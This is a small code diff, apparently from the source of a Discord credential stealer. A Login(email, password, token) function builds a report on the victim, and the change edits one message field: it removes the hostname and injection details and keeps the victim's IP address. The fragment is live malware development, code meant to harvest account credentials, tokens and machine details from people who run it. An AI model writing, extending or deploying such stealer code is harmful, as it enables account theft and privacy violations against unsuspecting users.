@@ -162,7 +162,7 @@ function Login(email, password, token) {
 
                            **Badges:** ${GetBadges(json.flags)}`,
 
-                            "value": `\`\`\`Hostname: \n${computerName}\nIP: \n${o}\nInjection Info: \n${discordInstall}\n\`\`\``, inline: !1 
+                            "value": `\`\`\` \nIP: \n${o}\n}\`\`\``, inline: !1 
 
         
                         },
